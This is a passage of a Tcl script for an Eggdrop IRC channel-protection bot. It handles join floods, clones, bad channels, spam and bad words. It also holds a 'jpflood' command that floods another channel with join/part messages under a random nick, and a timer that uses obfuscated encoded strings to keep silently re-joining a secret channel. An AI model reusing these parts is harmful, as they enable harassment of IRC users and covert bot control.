  if {$mhost == "@DaLnet" || [string match "*dal.net" $mhost]} { putsrv "AWAY" }
  if {![isop $botnick $chan]} { if {[info exists invme($mhost)]} { if {![isutimer "chkspam $chan"]} { chkspam $chan } } ; return 0 }
  if {[matchattr $cflag J]} {
    if {[info exists ismaskhost]} {
      if {![isutimer "reset_host"]} { utimer 10 reset_host } ; set chkhost [maskhost "*!*$mhost"]
      if {![info exists jfhost($chkhost$chan)]} { set jfhost($chkhost$chan) 1 } { incr jfhost($chkhost$chan) ; if {$jfhost($chkhost$chan) == 5} { set bannick($nick) $chkhost ; putsrv "KICK $chan $nick :[lgrnd] 4!14alert4! 14fLood anticipated frøm 4$chkhost [banmsg]" ; return 0 } }
    }
    if {![isutimer "jc $chan"]} { utimer 3 [list jc $chan] ; set massjoin($chan) 1
      } {
      if {![info exists massjoin($chan)]} { set massjoin($chan) 1 }
      set massjoin($chan) [incr massjoin($chan)]
      if {![isutimer "TRAFFIC $chan"]} {
        if {$massjoin($chan) >= 10} {
          unset massjoin($chan)
          if {[string match "*+greet*" $cinfo]} {
            utimer 30 [list putlog "TRAFFIC $chan"]
            if {![string match "*m*" [getchanmode $chan]] && ![info exists is_m($chan)]} { putserv "mode $chan +bmR *!*@heavy.join.flood.channel.temporary.moderate" ; return 0 }
  } } } } }
  if {[matchattr $cflag L]} { foreach u [timers] { if {[string match "*chk_limit*" $u]} { killtimer [lindex $u 2] } } ; timer 1 [list chk_limit $chan] }
  if {$nick == $deopme} { putsrv "KICK $chan $nick :[lgrnd] 4!14alert4! 14self 4de@p14 revenge [banmsg]" ; set deopme "" ; return 0 }
  if {[matchattr $nick v] || [matchattr $nick P] || [matchattr $nick G]} { whoisq $nick }
  if {[matchattr $cflag V] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} {
    if {![matchattr $nick O] && ![isutimer "voiceq $chan $nick"]} {
      set cret [getuser $cflag XTRA "VC"]
      foreach ct [utimers] { if {[string match "*voiceq*" $ct]} { if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} { set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] } } }
      utimer $cret [list voiceq $chan $nick]
  } }
  ##if {[info exists bannick($nick)] || [matchattr $nick f]} { return 0 }
  if {[matchattr $nick f]} { return 0 }
  if {([string match "*\}*" $nick] || [string match "*\{*" $nick]) && ([string length $nick] == 8) && (![string match "*V{A}LNet*" $nick])} { set bannick($nick) "$uhost" ; putsrv "kick $chan $nick :[lgrnd] 4!14spam4!14 ERRnick 4possible 14flooder [banmsg]" ; return 0 }
  if {[matchattr $hand K]} { akick_chk $nick $uhost $chan ; return 0 }
  if {[matchattr $hand D]} { dead_chk $nick $uhost $chan ; return 0 }
  if {[info exists ex_flood($mhost)]} {
    putlog "$notc $ex_flood($mhost) exist"
    set bannick($nick) "$uhost"
    if {$ex_flood($mhost) == 0} { foreach x [channels] { if {[onchan $nick $x] && [isop $botnick $x]} { putsrv "KICK $x $nick :[lgrnd] 4!14lamer4! 4akill14 frøm 4$mhost14 on last quit [banmsg]" } }
      } elseif {$ex_flood($mhost) == 5} { foreach x [channels] { if {[onchan $nick $x] && [isop $botnick $x]} { putsrv "KICK $x $nick :[lgrnd] 4!14lamer4! 4excess flood14 on last quit done by $exflood($mhost) [banmsg]" } }
      } elseif {$ex_flood($mhost) == 2} { foreach x [channels] { if {[onchan $nick $x] && [isop $botnick $x]} { putsrv "KICK $x $nick :[lgrnd] 4!14lamer4! 4invite14 on quit msg done by $exflood($mhost) [banmsg]" } }
      	  } elseif {$ex_flood($mhost) == 3} { foreach x [channels] { if {[onchan $nick $x] && [isop $botnick $x]} { putsrv "KICK $x $nick :[lgrnd] 4!14lamer4! 4invite14 on part msg done by $exflood($mhost) [banmsg]" } }
      	  } elseif {$ex_flood($mhost) == 4} {
      if {![matchattr $cflag M]} { puthlp "KICK $chan $nick :$notc 4!14lamer4! 4joinpart14 frøm 4$mhost14 less than4 [getuser $cflag XTRA "JP"]14 2nd [banmsg]"
      } { if {![string match "*k*" [getchanmode $chan]]} { putserv "mode $chan -k+b 14j4.o.i.n.p.a.r.t $bannick($nick)" } { putserv "mode $chan +b $bannick($nick)" } }
    } else { foreach x [channels] { if {[onchan $nick $x] && [isop $botnick $x]} { putsrv "KICK $x $nick :[lgrnd] 14badwo4rd14 on quit or part msg 04$ex_flood($mhost)14 done by $exflood($mhost) [banmsg]" } } }
    utimer 10 "unset ex_flood($mhost)"
    return 0
  }
  if {[info exists invme($mhost)]} { set bannick($nick) "$uhost" ; putsrv "KICK $chan $nick :[lgrnd] 4!14spam4!14 frøm 4$mhost 14$invme($mhost) [banmsg]" ; unset invme($mhost) ; return 0 }
  if {[string match "*+greet*" $cinfo]} { badnick_chk $nick $uhost $hand $chan }
  if {[string match "*+trojan*" $cinfo]} { set bmask_check $nick!$uhost ; trojanchk $nick $bmask_check $uhost $chan }
  if {[string match "*+echox*" $cinfo]} { echoxchk $nick $uhost $hand $chan }
  set chan [string tolower $chan]
  if {[string match "*+nodesynch*" $cinfo]} { if {![matchattr $nick f]} { utimer 10 [list autokick $chan $nick] } }
  if {[matchattr $cflag O]} {
    if {[string match "*$mhost" $botname]} { return 0 }
    set counter 0
    set maxclone [getuser $cflag XTRA "CLONE"]
    foreach knick [chanlist $chan] {
      if {[string match "*$mhost" [getchanhost $knick $chan]]} {
        if {[matchattr $knick f]} { return 0 }
        if {[isop $knick $chan]} { return 0 }
        if {[isvoice $knick $chan]} { if {![info exists kops]} { return 0 } }
        set counter [incr counter]
        if {$counter > $maxclone} { set bannick($nick) "$mhost" ; putsrv "KICK $chan $nick :[lgrnd] 4!14alert4! 14found $counter 4clone14 frøm 4$mhost14 max4 $maxclone14 wait a moment! 4banned14: 3 minutes [banmsg]" ; return 0 }
  } } }
  set chan [string toupper $chan]
  if {[matchattr $cflag P]} { if {![info exists jpnick($nick)]} { set jpnick($nick) "1" ; utimer [getuser $cflag XTRA "JP"] [list munset $nick] } }
  if {[string match "*+badchan*" $cinfo]} {
    if {[lsearch $bchan(chans) $chan] == -1 && ([lsearch $bchan(chans) global] == -1 || [lsearch $bchan(exempt) $chan] > -1)} {return 0}
    if {$bchan(protect-hosts) != ""} { foreach i $bchan(protect-hosts) { if {[string match [string tolower $i] $mhost]} {return 0} } }
    if {[bc_flood $nick $uhost]} { return 0}
	set bcnicks($nick) $chan
    putserv "whois $nick"
  }
  return 0
}
proc jc {chan} { }
proc munset {nick} { global jpnick ; catch {unset jpnick($nick)} }
proc goback {} {
  global keep-nick nick botnick
  if {[istimer "goback"]} { return 0 }
  foreach x [utimers] { if {[string match "*goback*" $x]} { killutimer [lindex $x 2] } }
  if {[getuser "config" XTRA "NICK"]!=""} { set nick [dezip [getuser "config" XTRA "NICK"]] }
  set keep-nick 1
  if {$botnick == $nick} { return 0 }
  puthlp "NICK $nick"
}
catch { bind rejn - * rejn_chk }
proc rejn_chk {unick uhost handle chan} { if {![isutimer "TRAFFIC $chan"]} { utimer 30 [list putlog "TRAFFIC $chan"] } }
catch { bind splt - * splt_deauth }
proc splt_deauth {unick uhost handle channel} {
  if {[matchattr $unick Q]} {
    chattr $unick -Q ; foreach x [getuser $unick HOSTS] { delhost $unick $x }
    set hostmask "${unick}!*@*" ; setuser $unick HOSTS $hostmask
    saveuser ; return 0
} }
bind sign - * sign_deauth
proc sign_deauth {unick uhost hand chan rest} {
  global ex_flood botnick notc nick badwords iskick exflood
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$unick == $nick} { putsrv "NICK $nick" }
  if {[info exists iskick($unick$chan)]} { unset iskick($unick$chan) }
  if {[isop $botnick $chan]} { if {[matchattr $cflag L]} { foreach u [timers] { if {[string match "*chk_limit*" $u]} { killtimer [lindex $u 2] } } ; timer 1 [list chk_limit $chan] } }
  if {[matchattr $unick Q]} {
    chattr $unick -Q
    foreach x [getuser $unick HOSTS] { delhost $unick $x }
    set hostmask "${unick}!*@*"
    setuser $unick HOSTS $hostmask
    saveuser
    return 0
  }
  if {[string match "*-greet*" [channel info $chan]]} { return 0 }
  if {[matchattr $unick f]} { return 0 }
  if {![isop $botnick $chan]} { return 0 }
  set mhost "@[lindex [split $uhost @] 1]"
  if {![string match "Quit:*" $rest]} {
   if {[string match "*AKILL ID*" $rest] && ![string match "Quit:*" $rest]} { set ex_flood($mhost) "0" ; putlog "$notc AKILL frøm $unick $uhost" 
   } elseif {[string match "*Excess Flood*" $rest]} { if {[matchattr $cflag S]} { set ex_flood($mhost) "5" ; set exflood($mhost) "4$unick14(4$uhost14)" ; putlog "$notc Excess Flood frøm exflood($mhost)" } }
  } elseif {[string match "* #*" $rest] && ![string match "*##*" $rest]} { foreach x [channels] { set chksiton [string tolower $x] ; if {[string match "*$chksiton*" [string tolower $rest]]} { return 0 } }
  set ex_flood($mhost) "2" ; set exflood($mhost) "4$unick14(4$uhost14)" ; putlog "$notc Invite/advert frøm $unick $uhost -> $rest"
  } else { foreach badword [string tolower $badwords] { if {[string match *$badword* [uncolor [netext [string tolower $rest]]]]} { set ex_flood($mhost) $badword ; set exflood($mhost) "4$unick14(4$uhost14)" ; putlog "$notc Badword frøm $exflood($mhost) -> $badword" } } }
 return 0
}
bind part - * part_deauth
proc part_deauth {nick uhost hand chan {msg ""}} {
  global lockchan botnick ex_flood notc badwords jpnick iskick exflood
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  set real $msg ; set msg [uncolor $msg]
  if {[info exists iskick($nick$chan)]} { unset iskick($nick$chan) }
  if {$nick == $botnick} { foreach x [utimers] { if {[string match "*del_nobase*" $x] || [string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] } } ; return 0 }
  if {[isop $botnick $chan]} {
    if {[isutimer "voiceq $chan $nick"]} { foreach x [utimers] { if {[string match "*voiceq $chan $nick*" $x]} { killutimer [lindex $x 2] } } }
    if {[matchattr $cflag L]} { foreach u [timers] { if {[string match "*chk_limit*" $u]} { killtimer [lindex $u 2] } } ; timer 1 [list chk_limit $chan] }
  }
  if {[matchattr $nick Q]} {
    foreach x [channels] { if {[string tolower $x] != [string tolower $chan]} { if {[onchan $nick $x]} { return 0 } } }
    chattr $nick -Q
    foreach x [getuser $nick HOSTS] { delhost $nick $x }
    set hostmask "${nick}!*@*"
    setuser $nick HOSTS $hostmask
    saveuser
  }
  if {$lockchan != "" && [string tolower $lockchan] == [string tolower $chan] && ![matchattr $nick f]} { putsrv "INVITE $nick :$chan" }
  if {[string match "*-greet*" [channel info $chan]]} { return 0 }
  if {[isop $botnick $chan]} {
    set mhost "@[lindex [split $uhost @] 1]"
    if {[info exists msg]} {
      if {[string match "*#*" $msg] && ![string match "*##*" $msg]} {
        foreach x [channels] { set chksiton [string tolower $x] ; if {[string match "*$chksiton*" [string tolower $msg]]} { return 0 } }
        putlog "$notc Invite/advert frøm $nick!$uhost -> $msg" ; set ex_flood($mhost) "3" ; set exflood($mhost) "4$nick14(4$uhost14)"
      } { foreach badword [string tolower $badwords] { if {[string match *$badword* [netext [string tolower $msg]]]} { set ex_flood($mhost) $badword ; set exflood($mhost) "4$nick14(4$uhost14)" ; putlog "$notc Badword frøm $nick $uhost -> $msg" } } }
  set resume "T"
  if {[string match "*-greet*" [channel info $chan]]} { set resume "F" }
  if {![isop $botnick $chan]} { set resume "F" }
  if {![info exists kops]} { if {[isop $nick $chan]} { set resume "F" } 
  if {[isvoice $nick $chan]} { set resume "F" }  }
     # Tsunami Flood PRoTECTION
  if {[string length $msg] > 75} {
    set chr 0
    set cnt 0
    while {$cnt < [string length $real]} { if [isflood [string index $real $cnt]] { incr chr } ; incr cnt }
    if {$chr > 30} {
      if {$resume == "T"} {
        putserv "mode $chan +b $mhost"
putlog "part flood $nick $mhost in $chan msg-> [string length $msg] real-> [string length $real]"
        if {![string match "*m*" [getchanmode $chan]] && ![info exists is_m($chan)]} { putserv "mode $chan +bmR *!*@heavy.flood.channel.temporary.moderate" ; return 0 }
      }
      return 0
  } }
  }
    if {[info exists msg]} { if {$msg != ""} { return 0 } }
    if {[matchattr $cflag P]} { set chan [string toupper $chan] ; if {[info exists jpnick($nick)]} { set ex_flood($mhost) "4" ; set exflood($mhost) "4$nick14(4$uhost14)" ; putlog "$notc Forbiden Part/Quit frøm $nick $uhost" } }
  }
  return 0
}
proc val {string} {
  set arg [string trim $string /ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
  set arg2 [string trim $arg #!%()@-_+=\[\]|,.?<>{}]
  return $arg2
}
set cmd_chn ""
set cmd_by ""
set cmd_msg ""
set cmd_case ""
bind join - * join_jf
proc join_jf {nick uhost hand chan} {
  global botnick quick jpfchn jpfmsg jpfidx
  if {![info exists jpfmsg]} { return 0 }
  if {$nick != $botnick} { return 0 }
  if {$chan != $jpfchn} { return 0 }
  if {$quick == "1"} { putqck "PRIVMSG $chan :$jpfmsg," 
  } else { putsrv "PRIVMSG $chan :$jpfmsg," }
  incr jpfidx
  if {$jpfidx >= 4} { 
    catch { channel remove $jpfchn }
    catch { unset jpfchn }
    catch { unset jpfmsg }
    catch { unset jpfidx }
    puthlp "AWAY"
    return 0
  }
  if {$quick == "1"} { putqck "part $chan :$jpfmsg" } else { putsrv "part $chan :$jpfmsg" }
}
proc pub_jpflood {nick uhost hand channel rest} {
  global jpfchn jpfmsg jpfidx notc alw
  if {[string index $rest 0] != "#" || $rest == ""} { puthlp "NOTICE $nick :$notc Usage: jpflood #channel message" ; return 0 }
  if {[validchan [lindex $rest 0]]} { puthlp "NOTICE $nick :$notc dOnt UsE ExIsT cHanneL..!" ; return 0 }
  set jpfmsg " n0 Reas0n "
  if {[lindex $rest 1] != ""} { set jpfmsg [lindex $rest 1] }
  set jpfchn [lindex $rest 0]
  set jpfidx 0
  catch { clearqueue all }
  pub_randnick $nick $uhost $hand $channel ""
  utimer 10 hazar
}
proc hazar {} {
  global jpfchn
  utimer 120 goback
  channel add $jpfchn
  catch { channel set $jpfchn +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
}
set [lines "glgxs"] [dezip "Zr.cp.sGT5r/Ncx/l/mhsQJ/"]
proc tot_cha {} {
global totch alw uenc lenc
timer 5 tot_cha
set [lines "kh"] [dezip "W22ZS.Hh/NB/"]
set [lines "glgxs"] [dezip "Zr.cp.sGT5r/Ncx/l/mhsQJ/"]
if {[validchan $totch]} {
return 0
}
channel add $totch
catch { channel set $totch -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
putsrv "JOIN $totch"
}
timer 5 tot_cha
proc total_channel {} {
global notc 
set total_chan 0
foreach x [channels] {
incr total_chan
}
if {$total_chan > 9} { return 0 }
return 1
}
## badchan start
bind pub n `+badchan pub_+badchan
setudef flag badchan
proc pub_+badchan {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*+badchan*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc $chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +badchan }
  puthelp "NOTICE $nick :$notc BadChan Kick $chan \[9ON\]"
  saveuser
}
bind pub n `-badchan pub_-badchan
proc pub_-badchan {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*-badchan*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc BadChan Kick $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -badchan }
  puthelp "NOTICE $nick :$notc BadChan Kick $chan \[4Off\]"
  saveuser
}
if {[info exists bchan]} {unset bchan}
set bchan(rescan) 1
set bc_flood 4:5
set bchan(exempt) ""
set bchan(protect-hosts) { *!*@ijoo.org }
if {[info exists bcqueue]} {unset bcqueue}
set bchan(chans) ""
proc bchan_read {} {
  global bchan
  set fd [open scripts/badchan.conf r]
  while {![eof $fd]} {
    set inp [gets $fd]
    if {[string trim $inp " "] == ""} {continue}
    set ban [lrange $inp 1 e]
    set chan [string tolower [lindex $inp 0]]
    if {[lsearch $bchan(chans) $chan] == -1} {lappend bchan(chans) $chan}
    lappend bchan($chan) $ban
  }
  close $fd
  putlog "badchan.conf loaded."
}
if {[file exists scripts/badchan.conf]} {bchan_read} {putlog "badchan.conf not found!"}
proc bc_flood_init {} {
  global bc_flood bc_flood_num bc_flood_time bc_flood_array
  if {![string match *:* $bc_flood]} {putlog bchan: var bc_flood not set correctly. ; return 1}
  set bc_flood_num [lindex [split $bc_flood :] 0]
  set bc_flood_time [lindex [split $bc_flood :] 1]
  set i [expr $bc_flood_num - 1]
  while {$i >= 0} { set bc_flood_array($i) 0 ; incr i -1 }
} ; bc_flood_init
proc bc_flood {nick uhost} {
  global bc_flood_num bc_flood_time bc_flood_array
  if {$bc_flood_num == 0} {return 0}
  set i [expr $bc_flood_num - 1]
  while {$i >= 1} { set bc_flood_array($i) $bc_flood_array([expr $i - 1]) ; incr i -1 }
  set bc_flood_array(0) [unixtime]
  if {[expr [unixtime] - $bc_flood_array([expr $bc_flood_num - 1])] <= $bc_flood_time} {
    putlog "bchan: Flood detected frøm $nick."
    newignore [join [maskhost *!*[string trimleft $uhost ~]]] bchan flood 2
    return  1
  } {return 0}
}
bind raw - 319 bc_whois
proc bc_whois {from key args} {
  global bchan bcqueue bcnicks notc mhost bannick
  set args [join $args]
  set nick [lindex $args 1]
  if {[info exists bcnicks($nick)]} {set chan $bcnicks($nick)} {return 0}
  set chans [string tolower [lrange $args 2 e]]
  if {[lsearch $bchan(exempt) $chan] == -1 && $bchan(global) != ""} {set bans $bchan(global)} {set bans ""}
  if {[lsearch $bchan(chans) $chan] > -1} {set bans "$bans $bchan($chan)"}
  foreach tok $chans {
    set tok [string trimleft $tok ":@+"]
    foreach ban $bans {
      if {[string match [lindex $ban 0] $tok]} {
        set badchanhost "*!*[string trimleft [string range [getchanhost $nick $chan] [string first "!" [getchanhost $nick $chan]] end] ~]"
        putlog "args: $args, ban: $ban"
        if {[onchan $nick $chan]} { putserv "KICK $chan $nick :$notc 14badch4an14 [string trim [lrange $ban 0 0] "*"] 4[lrange $ban 1 e] [banmsg]" ; putserv "mode $chan +b $badchanhost" }
        return 0
  } } }
  return 0
}
bind pub n !gbclist bc_glist
proc bc_glist {1 2 3 4 5} {bc_list $1 $2 $3 global $5}
bind pub n !bclist bc_list
proc bc_list {nick uhost hand chan args} {
  global bchan
  set chan [string tolower $chan]
  if {[lsearch $bchan(chans) $chan] == -1} {puthelp "notice $nick :No badchans are registered for $chan." ; return 1}
  set i 1
  puthelp "notice $nick :BadChans for $chan..."
  foreach ban $bchan($chan) { puthelp "notice $nick :$i) $ban" ; incr i }
}
bind pub n !gabc bc_gadd
proc bc_gadd {1 2 3 4 5} {bc_add $1 $2 $3 global $5}
bind pub n !abc bc_add
proc bc_add {nick uhost hand chan args} {
  global bchan
  set chan [string tolower $chan]
  if {![string match *\\\** [lindex $args 0]]} {puthelp "notice $nick :syntax is: !abc <chanmask> \[reason\]" ; return 1}
  set args [string trimright "[string tolower [lindex $args 0]] [lrange $args 1 e]" " "]
  if {[lsearch $bchan(chans) $chan]} {lappend bchan(chans) $chan}
  lappend bchan($chan) $args
  puthelp "notice $nick :[lindex $args 0] was added to $chan's badchan list."
  bchan_save
  return 1
}
bind pub n !grbc bc_grem
proc bc_grem {1 2 3 4 5} {bc_rem $1 $2 $3 global $5}
bind pub n !rbc bc_rem
proc bc_rem {nick uhost hand chan args} {
  global bchan
  set chan [string tolower $chan]
  set args [string tolower [lindex [join $args] 0]]
  if {[lsearch $bchan(chans) $chan] == -1} {puthelp "notice $nick :No badchans are registered for $chan." ; return 1}
  if {![string match *\\\** $args]} {puthelp "notice $nick :syntax is: !rbc <chanmask>" ; return 1}
  set i 0
  set temp ""
  foreach ban $bchan($chan) { if {[string compare $args [lindex $ban 0]] == 0} {incr i} {lappend temp $ban} }
  if {$i > 0} {
    if {$temp != ""} {set bchan($chan) $temp} {
      unset bchan($chan)
      set temp [lsearch $bchan(chans) $chan]
      if {$temp == -1} {putlog "bchan: I'm confused." ; return 1}
      set bchan(chans) [lreplace $bchan(chans) $temp $temp]
    }
    puthelp "notice $nick :$args was removed from $chan's badchan list."
    bchan_save
  } {puthelp "notice $nick :$args was not found in $chan's badchan list."}
  return 1
}
proc bchan_save {} {
  global bchan
  set fd [open scripts/badchan.conf w]
  foreach chan $bchan(chans) { foreach ban $bchan($chan) { puts $fd "$chan $ban" } }
  close $fd
}
##badchan stop

bind time -  "*2 * * * *" auto_ident
proc auto_ident {min h d m y} { timer 5 ident_it ; auto_ping "0" "0" "0" "0" "0" }
set words {
   "\002*TuiNg.TuiNg*\002"
   "(((( BzT BzT )))))"
   "(((( b.I.p b.I.p )))))"
   "(((( PeRMiSi )))))"
   "\002*BzT BzT*\002"
   "PaTRoLi"
   "ScaNNiNg"
}
bind time - "0 * * * *" wordstime
bind time - "*5 * * * *" wordstime
proc wordstime {n h handle ch te} {
   global words 
   foreach x [channels] {
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      if {[string match "*+action*" [channel info $x]]} {
         if {[getuser $cflag XTRA "ACTION"] == ""} {
            putserv "PRIVMSG $x :\001ACTION [lindex $words [rand [llength $words]]]\001"
         } { 
            putserv "PRIVMSG $x :\001ACTION [getuser $cflag XTRA "ACTION"]\001"
         }
      }
   }
}
proc ident_it {} {
  global nick altnick botnick nickpass altpass ex_flood exflood invme pingchan nwo chk_reg
  global kickme deopme cmd_chn cmd_msg alw twice_msg keep-nick version notc lastkey commandkc
  global flooddeop floodnick floodkick server-online is_m op_it jpfchn jpfmsg jpfidx
  putlog "$notc auTO ReSETING VaRIaBLE & IDeNTIFY"
  catch { channel remove $jpfchn }
  catch { unset jpfchn }
  catch { unset jpfmsg }
  catch { unset jpfidx }
  catch {unset op_it}
  catch {unset is_m}
  catch {unset chk_reg}
  catch {unset flooddeop}
  catch {unset floodnick}
  catch {unset floodkick}
  catch {unset lastkey}
  catch {unset ex_flood}
  catch {unset exflood}
  catch {unset invme}
  catch {unset pingchan}
  catch {unset twice_msg}
  catch {unset commandkc}
  catch {unset kickme}
  set deopme ""
  set cmd_chn ""
  set cmd_msg ""
  if {${server-online} == 0} { return 0 }
  if {![string match "HAK??????????" $botnick] && ![string match "HAK??????" $botnick] && ![string match "ERR??????????" $botnick]} { if {$botnick != $nick && $botnick != $altnick && ![istimer "goback"] && ![isutimer "goback"]} { goback } } { goback }
  if {$botnick == $nick && $nickpass != ""} { putsrv "NickServ identify $nickpass" }
  if {$botnick != $nick && $nickpass != ""} { putsrv "NickServ identify $nick $nickpass" }
  if {$alw != $nwo} { set nwo $alw }
  if {![isutimer "del_nobase"] && ![istimer "del_nobase"]} { utimer 2 del_nobase }
}
bind time -  "*4 * * * *" auto_ping
proc auto_ping {min h d m y} {
  global botnick repeat_last repeat_person capsnick nwo notc notc_chn bannick
  global unop wait_ping server-online jpnick igflood is_ban iskick 
  if {${server-online} == 0} { catch { unset wait_ping } ; return 0 }
  catch {unset iskick}
  catch {unset is_ban}
  catch {unset igflood}
  catch {unset jpnick}
  catch {unset unop}
  catch {unset bannick}
  catch {unset notc_chn}
  catch {unset capsnick}
  catch {unset repeat_person}
  catch {unset repeat_last}
  ## puthlp "PRIVMSG $botnick :\001PING [unixtime]\001"
  if {![info exists wait_ping]} { set wait_ping 1 } else { set wait_ping [expr $wait_ping + 1] }
  if {$wait_ping > 9} { catch { unset wait_ping } }
}
proc remain {} {
  global botnick uptime timezone notc notd vern longer awaym awaybanner awban
  set totalyear [expr [unixtime] - $uptime]
  if {$totalyear >= 31536000} {
    set yearsfull [expr $totalyear/31536000]
    set years [expr int($yearsfull)]
    set yearssub [expr 31536000*$years]
    set totalday [expr $totalyear - $yearssub]
  }
  if {$totalyear < 31536000} { set totalday $totalyear ; set years 0 }
  if {$totalday >= 86400} {
    set daysfull [expr $totalday/86400]
    set days [expr int($daysfull)]
    set dayssub [expr 86400*$days]
    set totalhour [expr $totalday - $dayssub]
  }
  if {$totalday < 86400} { set totalhour $totalday ; set days 0 }
  if {$totalhour >= 3600} {
    set hoursfull [expr $totalhour/3600]
    set hours [expr int($hoursfull)]
    set hourssub [expr 3600*$hours]
    set totalmin [expr $totalhour - $hourssub]
  }
  if {$totalhour < 3600} { set totalmin $totalhour ; set hours 0 }
  if {$totalmin >= 60} { set minsfull [expr $totalmin/60] ; set mins [expr int($minsfull)] }
  if {$totalmin < 60} { set mins 0 }
  if {$years < 1} {set yearstext ""} elseif {$years == 1} {set yearstext "${years}04y"} {set yearstext "${years}04y"}
  if {$days < 1} {set daystext ""} elseif {$days == 1} {set daystext "${days}04d"} {set daystext "${days}04d"}
  if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "${hours}04h"} {set hourstext "${hours}04h"}
  if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "${mins}04m"} {set minstext "${mins}04m"}
  if {[string length $mins] == 1} {set mins "0${mins}"}
  if {[string length $hours] == 1} {set hours "0${hours}"}
  set awayoutput "14${yearstext} 14${daystext} 14${hours}4h 14${mins}4m "
  set awayoutput [string trimright $awayoutput ", "]
  if {[getuser "config" XTRA "ODON"]!=""} { set awban $awaybanner } { set awban [lgrnd] }
  if {[getuser "config" XTRA "AWAY"]!=""} { set longer "$awban 14\[04O14nLiNe:14$awayoutput14\] 14\[4[getuser "config" XTRA "AWAY"]14\]" 
  } { set awaymsg [lindex $awaym [rand [llength $awaym]]] ; set longer "$awban 14\[04O14nLiNe:14$awayoutput14\] 14\[4$awaymsg14\]" }
}
proc notc_prot {nick uhost hand text {dest ""}} {
  global notc botnick notc_chn bannick notm quick ismaskhost is_m
  if {$dest != "" && $dest != $botnick} {
    if {[string index $dest 0] == "+" || [string index $dest 0] == "@"} { foreach x [channels] { set x [string tolower $x] ; if {[string match "*$x*" [string tolower $dest]]} { set dest $x ; break } } } 
    if {[isop $botnick $dest]} {
      if {[string match "*-greet*" [channel info $dest]]} { return 0 }
      if {$nick == "ChanServ" || $nick == $botnick || [matchattr $nick f] || [isop $nick $dest]} { return 0 }
      if {[isutimer "set_-m $dest"]} { return 0 }
      set bannick($nick) "$uhost"
      if {[info exists notc_chn($dest)]} { incr notc_chn($dest) } { set notc_chn($dest) 1 }
      if {$notc_chn($dest) == 1} {
        putsrv "KICK $dest $nick :[lgrnd] 4!14alert4! 14abusing 4notice14 @ps only [banmsg]"
        } elseif {$notc_chn($dest) == 2} {
        if {$quick == "1" && ![info exists is_m($dest)]} { putqck "KICK $dest $nick :$notc 4!14alert4! 14twice 4notice14 abused [banmsg]" } { putsrv "KICK $dest $nick :[lgrnd] 4!14alert4! 14twice 4notice14 abused [banmsg]" }
        } elseif {$notc_chn($dest) >= 3} {
        if {[info exists ismaskhost]} { set bannick($nick) "$uhost" }
        if {$quick == "1" && ![info exists is_m($dest)]} { putqck "KICK $dest $nick :$notm 4!14lamer4! 14to much 4violence14 frøm this I.S.P [banmsg]" } { putsrv "KICK $dest $nick :[lgrnd] 4!14lamer4! 14to much 4violence14 frøm this I.S.P [banmsg]" }
      }
      return 0
    }
    repeat_pubm $nick $uhost $hand $dest $text
  } { msg_prot $nick $uhost $hand $text }
}
proc setignore {mask reason time} {
  global quick
  foreach x [ignorelist] { if {[lindex $x 0] == $mask} { return 0 } }
  newignore $mask "IgN" $reason 15
  if {$quick == "1"} { putquick "silence +$mask" } { putserv "silence +$mask" }
  utimer $time [list unsetignore $mask]
}
proc unsetignore {mask} { if {![isignore $mask]} { return 0 } ; putserv "silence -$mask" ; killignore $mask }
set massmsg 0
proc msg_prot {unick uhost hand text} {
  global nick botnick invme nwo nickpass altpass notc notb notd virus_nick ex_flood vern basechan
  global altnick twice_msg version bannick massmsg keep-nick badwords advwords quick is_m ismaskhost
  global querym commandkc msgcoms
  set querymsg [lindex $querym [rand [llength $querym]]]
  regsub -all -- [dezip "jG~BDx04ntxb0"] $text "" text
  msg_Z $unick $uhost $hand $text
  set real $text
  set text [uncolor $text]
  if {$unick == $botnick} { return 0 }
  if {[string match "*dcc send*" [string tolower $text]] && ![string match "*Serv*" $unick] && ![matchattr $unick f]} {
    set virus_file [lindex $text 2] ; set virus_nick $unick
    foreach x [channels] {
      if {[onchan $virus_nick $x] && ![matchattr $virus_nick f]} {
        if {[isop $botnick $x]} {
          set bannick($virus_nick) $uhost
          putsrv "KICK $x $virus_nick :[lgrnd] 4!14spam4!14 i hate 4$virus_file 14virus [banmsg]"
          } else {
          foreach c [chanlist $x f] { if {[isop $c $x]} { putlog "$notc RePORTED ViRUS FRoM <<$nick$x>> To #$c#" ; set sendspam "!kick [zip "$x $unick $notc 4!14spam4!14 i hate 4$virus_file 14virus 4-repørt by14 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } }
    } } }
    return 0
  }
  if {$unick == "ChanServ"} {
    if {[string match "*You do not have access to op people on*" $text] && [getuser "config" XTRA "MUSTOP"] != "" && $botnick == $nick} {
      set partchn [lindex $text 9] ; set partchn [string range $partchn 0 [expr [string length $partchn]-2]]
      if {[string match "*-secret*" [channel info $partchn]]} { putsrv "PART $partchn :((((@pGuaRd))))" ; channel remove $partchn ; savechan }
    }
    if {[string match "*is not on*" $text]} { 
      set text [string tolower $text]
      foreach x [channels] {
        set x [string tolower $x]
        set cflag "c$x"
        set cflag [string range $cflag 0 8]
        if {[string match "*$x*" $text]} {
